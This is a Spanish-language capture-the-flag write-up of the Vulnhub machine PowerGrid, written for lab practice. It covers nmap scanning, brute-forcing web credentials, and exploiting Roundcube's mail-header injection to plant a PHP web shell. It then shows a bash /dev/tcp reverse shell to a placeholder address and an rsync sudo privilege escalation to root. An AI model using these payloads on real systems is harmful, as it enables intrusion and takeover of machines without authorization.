---
title: PowerGrid | CTF Writeup - Vulnhub
date: 2024-03-11 14:49:00 +/-TTTT
categories: [PENTESTING, CTF]
tags: [vulnhub, writeup, bruteforce, rce, pgpdecrypt, crytpography]    
---

# PowerGrid

>Para entender el contexto de esta máquina, la página de VulnHub nos da una breve descripción: 

`Los ciberdelincuentes se han apoderado de la red energética en toda Europa. Como miembro del servicio de seguridad, usted tiene la tarea de ingresar a su servidor, obtener acceso raíz y evitar que ejecuten su malware antes de que sea demasiado tarde.

`Sabemos por información de inteligencia anterior que este grupo a veces usa contraseñas débiles. Le recomendamos que primero observe este vector de ataque; asegúrese de configurar sus herramientas correctamente. No tenemos tiempo que perder.`

`Desafortunadamente, los delincuentes han puesto en marcha un reloj de 3 horas. ¿Podrás llegar a su servidor a tiempo antes de que se implemente su malware y destruyan la evidencia en su servidor?``

>Primeramente, intentamos escanear la red local para encontrar la IP del servidor de los atacantes.

```zsh
> netdiscover -r 192.168.216.0/24 -P > discover.txt
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.216.1   00:50:56:c0:00:08      1      60  VMware, Inc.
 192.168.216.2   00:50:56:e2:11:a1      1      60  VMware, Inc.
 192.168.216.152 00:0c:29:35:09:22      1      60  VMware, Inc.
 192.168.216.254 00:50:56:f9:2e:59      1      60  VMware, Inc.

-- Active scan completed, 4 Hosts found.
```

>Como siempre, exportamos la IP a una variable de entorno para facilitar el trabajo.

```zsh
> export IP=192.168.216.152
```

>Hacemos un escaneo con `nmap` para averiguar puertos abiertos y servicios corriendo dentro de esos puertos.

```zsh
# Nmap 7.94 scan initiated Sun Mar  3 01:12:58 2024 as: nmap -sS -p- --open -T5 -Pn -n -oN scan.txt 192.168.216.152
Nmap scan report for 192.168.216.152
Host is up (0.026s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE
80/tcp  open  http
143/tcp open  imap
993/tcp open  imaps
MAC Address: 00:0C:29:35:09:22 (VMware)

# Nmap done at Sun Mar  3 01:14:00 2024 -- 1 IP address (1 host up) scanned in 61.36 seconds
```

>Indagamos en las versiones que corren los servicios con los parámetros `-sCV`.

```zsh
# Nmap 7.94 scan initiated Sun Mar  3 01:18:59 2024 as: nmap -sCV -p80,143,993 -Pn -n -vvv -oN versions.txt 192.168.216.152
Nmap scan report for 192.168.216.152
Host is up, received arp-response (0.0012s latency).
Scanned at 2024-03-03 01:19:00 -03 for 14s

PORT    STATE SERVICE  REASON         VERSION
80/tcp  open  http     syn-ack ttl 64 Apache httpd 2.4.38 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: PowerGrid - Turning your lights off unless you pay.
|_http-server-header: Apache/2.4.38 (Debian)
143/tcp open  imap     syn-ack ttl 64 Dovecot imapd
|_imap-capabilities: ENABLE OK more LOGIN-REFERRALS STARTTLS Pre-login LOGINDISABLEDA0001 ID listed capabilities have IMAP4rev1 LITERAL+ IDLE post-login SASL-IR
| ssl-cert: Subject: commonName=powergrid
| Subject Alternative Name: DNS:powergrid
| Issuer: commonName=powergrid
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-05-19T16:49:55
| Not valid after:  2030-05-17T16:49:55
| MD5:   29a4:274f:71a8:9044:9910:0979:8540:ecab
| SHA-1: 06a5:0056:cf2c:7f94:9aad:01e7:7e91:7006:4eb0:d553
| -----BEGIN CERTIFICATE-----
| MIIC2TCCAcGgAwIBAgIUUA33Rof9HMSXyS7PV8uCO9kDiBYwDQYJKoZIhvcNAQEL
| BQAwFDESMBAGA1UEAwwJcG93ZXJncmlkMB4XDTIwMDUxOTE2NDk1NVoXDTMwMDUx
| NzE2NDk1NVowFDESMBAGA1UEAwwJcG93ZXJncmlkMIIBIjANBgkqhkiG9w0BAQEF
| AAOCAQ8AMIIBCgKCAQEA38l1rI8ssL1q+bILF2ki6ndMJRkfamXi7DPkguTkQVUL
| B1CjBtnXtLNBJ3chBN53MU0geUuIKKJDVTomTxC5kEAEZ9majFqYrKCaIGABzJuT
| rrUV3FlsvxcK455CaSoCyHoxC8AtyG4I8kdcsOeZPuTJkuv95oR2JmtbJSpyT4Vy
| SjZUsRunB2RD5taCWmEbHR4jFpgcMVPbgsw6QjE4OFemdGkaX5sjZocwZs8o3yhO
| /yjxfJMtf7XVhIjbgiIcvp2qUZAC2CpaM/n+6AbBJqa5WIBah1dKUYO1xoQQLDgX
| t8pQB5COH0UbtYW1y556PMofgG3jkKNC/R0Ivcz/hwIDAQABoyMwITAJBgNVHRME
| AjAAMBQGA1UdEQQNMAuCCXBvd2VyZ3JpZDANBgkqhkiG9w0BAQsFAAOCAQEAlnjZ
| OOAAOuoAIqO9cYjrVi5oo01u8ACoiwdXBmra8wXgEMVXoAnmT1sukl89aU2nrMRe
| 2Ep1IRuadQIrUUKIRCcwVPVOsl4LqwaeEUvzGP4D03n1KAvu/nRSHqbUWRVbGzKX
| H5pQlHIUPPoaYR+soXTH2FZDtBwy8oyBMxAxgoFjPOoxmVK/5DUE8etTB5bItE0f
| /cv8gWGtaPsk50Fvu+pXfKfgEOX1769lwuXthNlzSsuPa5LjDSSv6Rii0R6ELuK0
| Runa+4YCOumR4kK1pwXxPJAQcDvhRDp/u/+NIZB72VEiJUv6RDkkAojAhtxzm2kr
| T+48miG6/ZX3hhypEw==
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
993/tcp open  ssl/imap syn-ack ttl 64 Dovecot imapd
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=powergrid
| Subject Alternative Name: DNS:powergrid
| Issuer: commonName=powergrid
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-05-19T16:49:55
| Not valid after:  2030-05-17T16:49:55
| MD5:   29a4:274f:71a8:9044:9910:0979:8540:ecab
| SHA-1: 06a5:0056:cf2c:7f94:9aad:01e7:7e91:7006:4eb0:d553
| -----BEGIN CERTIFICATE-----
| MIIC2TCCAcGgAwIBAgIUUA33Rof9HMSXyS7PV8uCO9kDiBYwDQYJKoZIhvcNAQEL
| BQAwFDESMBAGA1UEAwwJcG93ZXJncmlkMB4XDTIwMDUxOTE2NDk1NVoXDTMwMDUx
| NzE2NDk1NVowFDESMBAGA1UEAwwJcG93ZXJncmlkMIIBIjANBgkqhkiG9w0BAQEF
| AAOCAQ8AMIIBCgKCAQEA38l1rI8ssL1q+bILF2ki6ndMJRkfamXi7DPkguTkQVUL
| B1CjBtnXtLNBJ3chBN53MU0geUuIKKJDVTomTxC5kEAEZ9majFqYrKCaIGABzJuT
| rrUV3FlsvxcK455CaSoCyHoxC8AtyG4I8kdcsOeZPuTJkuv95oR2JmtbJSpyT4Vy
| SjZUsRunB2RD5taCWmEbHR4jFpgcMVPbgsw6QjE4OFemdGkaX5sjZocwZs8o3yhO
| /yjxfJMtf7XVhIjbgiIcvp2qUZAC2CpaM/n+6AbBJqa5WIBah1dKUYO1xoQQLDgX
| t8pQB5COH0UbtYW1y556PMofgG3jkKNC/R0Ivcz/hwIDAQABoyMwITAJBgNVHRME
| AjAAMBQGA1UdEQQNMAuCCXBvd2VyZ3JpZDANBgkqhkiG9w0BAQsFAAOCAQEAlnjZ
| OOAAOuoAIqO9cYjrVi5oo01u8ACoiwdXBmra8wXgEMVXoAnmT1sukl89aU2nrMRe
| 2Ep1IRuadQIrUUKIRCcwVPVOsl4LqwaeEUvzGP4D03n1KAvu/nRSHqbUWRVbGzKX
| H5pQlHIUPPoaYR+soXTH2FZDtBwy8oyBMxAxgoFjPOoxmVK/5DUE8etTB5bItE0f
| /cv8gWGtaPsk50Fvu+pXfKfgEOX1769lwuXthNlzSsuPa5LjDSSv6Rii0R6ELuK0
| Runa+4YCOumR4kK1pwXxPJAQcDvhRDp/u/+NIZB72VEiJUv6RDkkAojAhtxzm2kr
| T+48miG6/ZX3hhypEw==
|_-----END CERTIFICATE-----
|_imap-capabilities: ENABLE OK more LOGIN-REFERRALS listed Pre-login capabilities ID AUTH=PLAINA0001 have IMAP4rev1 LITERAL+ IDLE post-login SASL-IR
MAC Address: 00:0C:29:35:09:22 (VMware)

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Mar  3 01:19:14 2024 -- 1 IP address (1 host up) scanned in 14.70 seconds
```

>Si nos vamos a la web, veremos lo siguiente.

![[Captura de pantalla (418).png]]({%link assets/img/powergrid/1.png%})

>Tenemos una lista de usuarios válidos: deez1, p48 y all2. Está el temporizador inicializado. Busquemos subdirectorios con el script `http-enum` de la herramienta `nmap`.

```zsh
# Nmap 7.94 scan initiated Sun Mar  3 01:22:37 2024 as: nmap --script http-enum -p80 -oN http-enum.txt 192.168.216.152
Nmap scan report for 192.168.216.152
Host is up (0.00050s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|_  /images/: Potentially interesting directory w/ listing on 'apache/2.4.38 (debian)'
MAC Address: 00:0C:29:35:09:22 (VMware)

# Nmap done at Sun Mar  3 01:22:38 2024 -- 1 IP address (1 host up) scanned in 0.53 seconds
```

>Dado que no nos descubrió mucho y el sitio es un sitio estático, optaré por usar `gobuster` para una búsqueda más intensa de directorios y archivos.

![[Pasted image 20240308193711.png]]({%link assets/img/powergrid/2.png%})

>Encontramos un directorio zmail, que parecería ser interesante.

![[Pasted image 20240308193746.png]]({%link assets/img/powergrid/3.png%})

>Nos piden credenciales para poder acceder a la web. Podemos probar con la herramienta `hydra` para hacer Brute Forcing.

![[Pasted image 20240308193937.png]]({%link assets/img/powergrid/4.png%})

>Ahora, con las credenciales encontradas (`p48:electrico`), podemos acceder. 

![[Pasted image 20240308194034.png]]({%link assets/img/powergrid/5.png%})

>Nos muestra esta interfaz para Roundcube, que es un cliente de correo electrónico para ver los mensajes por medio de la web. Si intentamos reutilizar las credenciales anteriormente descubiertas, veremos que nos dejará entrar a este portal.

![[Pasted image 20240308194149.png]]({%link assets/img/powergrid/6.png%})

>Al parecer, tenemos un mensaje en bandeja de entrada. Es la clave SSH de uno de los atacantes encriptada con PGP. Dice que se puede desencriptar con la clave privada de PGP del usuario p48.

![[Pasted image 20240308194301.png]]({%link assets/img/powergrid/7.png%})

>Si buscamos vulnerabilidades de Roundcube, encontraremos una interesante con la herramienta `searchsploit`. La vulnerabilidad es la siguiente: https://www.exploit-db.com/exploits/40892.

>Esta vulnerabilidad deriva de que la función `mail()` de PHP llama al programa de CLI `sendmail`, y la sección del remitente en la petición HTTP puede ser modificada para que se le añadan parámetros y así crear un archivo PHP malicioso.

>Para ver esto más en detalle, intentemos hacer una petición HTTP mandando un correo para ver si podemos interceptar el mail.

![[Pasted image 20240308195526.png]]({%link assets/img/powergrid/8.png%})

![[Pasted image 20240308195425.png]]({%link assets/img/powergrid/9.png%})

>Efectivamente. La sección de \_subject y la sección de \_from son vulnerables. Podemos intentar modificarlas mandando la siguiente petición al servidor:

![[Pasted image 20240308195703.png]]({%link assets/img/powergrid/10.png%})

>El \_subject cambió a `<?php system($_GET['cmd']); ?>` y el \_from cambió a lo que nos indicaba el POC.
>Mandamos el payload y vamos al archivo creado en el servidor.

![[Pasted image 20240308195724.png]]({%link assets/img/powergrid/11.png%})

>Ahora solo falta intentar ejecutar algún comando.

![[Pasted image 20240308195901.png]]({%link assets/img/powergrid/12.png%})

>Se ve representado el stdout de nuestro comando inyectado. Ahora solo queda ganar una [[Reverse Shell]]. De nuestro lado, nos ponemos en escucha por un puerto con `nc`. En la webshell, colocamos el siguiente comando: `bash -c 'bash -i >& /dev/tcp/tuIP/tuPuerto 0>&1'`.

![[Pasted image 20240308200001.png]]({%link assets/img/powergrid/13.png%})

>Vemos nuestra primera flag:

![[Pasted image 20240308200244.png]]({%link assets/img/powergrid/14.png%})

>Quizás debamos migrar de usuario. Intentamos reutilizar las credenciales que ya sabíamos (`p48:electrico`).

![[Pasted image 20240308200349.png]]({%link assets/img/powergrid/15.png%})

>Hay contenedores en una de las subredes de las que forma parte la máquina.

![[Pasted image 20240308200418.png]]({%link assets/img/powergrid/16.png%})

>Vemos la clave PGP privada de p48, y nos la pasamos a nuestro directorio.

![[Pasted image 20240308200708.png]]({%link assets/img/powergrid/17.png%})

>En mi caso, decidí desencriptar el mensaje con https://pgptool.org. La passphrase era `electrico`, la misma que la contraseña del usuario.

![[Pasted image 20240308200800.png]]({%link assets/img/powergrid/18.png%})

>Dado que en el mensaje nos hablaban de un servidor de backup, podemos pensar que sería uno de los contenedores que están en la interfaz de red docker0. Dado que la máquina es la 172.17.0.1, podemos buscar más hosts con el puerto 22 abierto con un simple script de bash.

```bash
#!/bin/bash

for i in $(seq 1 254); do
	echo '' > /dev/tcp/172.17.0.$i/22 2>/dev/null && echo "[!] HOST 172.17.0.$i in port 22 is active!";
done
```

>Ejecutamos.

![[Pasted image 20240308201052.png]]({%link assets/img/powergrid/19.png%})

>Nos dice que el host 172.17.0.2 está activo y en el mismo corre el puerto 22.
>Si nos intentamos conectar por SSH como p48:

![[Pasted image 20240308201212.png]]({%link assets/img/powergrid/20.png%})

>Estamos en el contenedor.

![[Pasted image 20240308201242.png]]({%link assets/img/powergrid/21.png%})

>Si hacemos `sudo -l` podemos ver que tenemos capacidad de ejecución del binario `/usr/bin/rsync` como el usuario root sin proporcionar contraseña.

![[Pasted image 20240308201356.png]]({%link assets/img/powergrid/22.png%})

>Buscamos en [GTFOBins](https://gtfobins.github.io) para poder escalar privilegios a partir de este binario. Usamos el siguiente comando: `sudo rsync -e 'bash -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null`. 

![[Pasted image 20240308201752.png]]({%link assets/img/powergrid/23.png%})

>Nuestra tercera flag nos indica que quizás debamos regresar a la máquina principal, la 172.17.0.1.

![[Pasted image 20240308201844.png]]({%link assets/img/powergrid/24.png%})

>Podemos pensar en que la clave pública de root en la 172.17.0.2 está en el archivo `known_hosts` del directorio `.ssh` de root en la máquina 172.17.0.1. Esto nos podría brindar acceso directo a la máquina principal sin brindar contraseña, solo con nuestra clave privada.

![[Pasted image 20240308202110.png]]({%link assets/img/powergrid/25.png%})

>Efectivamente, ganamos acceso por esta misma razón. Ahora solo nos queda la última flag.

![[Pasted image 20240308202144.png]]({%link assets/img/powergrid/26.png%})

>Eliminamos el archivo como nos indica la máquina para detener el temporizador. Y listo!
>Fue una máquina muy interesante, sobretodo la explotación de la vulnerabilidad de Roundcube.  La escalada de privilegios, aunque no fue difícil, estuvo buena para practicar.
